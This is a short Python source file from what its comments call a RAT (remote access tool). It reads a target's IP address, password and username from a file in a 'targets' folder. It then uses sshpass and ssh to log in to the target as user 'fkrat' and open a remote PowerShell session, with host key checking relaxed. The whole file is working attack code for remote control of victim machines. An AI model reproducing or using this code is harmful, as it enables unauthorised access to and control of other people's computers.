import os
import time


# read config file
def read_config(config_file):
    configuration = {}

    time.sleep(2)

    # get file content
    read_lines = open("./targets/" + config_file, "r").readlines()

    # get target information
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["USERNAME"] = read_lines[2].strip()

    # return config
    return configuration


# connects RAT to target        Payload 0
def connect(file):
    config = read_config(file)
    ipv4 = config.get("IPADDRESS")
    target_password = config.get("PASSWORD")
    username = config.get("USERNAME")

    # remote connect
    os.system("clear")
    os.system(f"sshpass -p \"{target_password}\" ssh fkrat@{ipv4} -o StrictHostKeyChecking=accept-new 'powershell'")

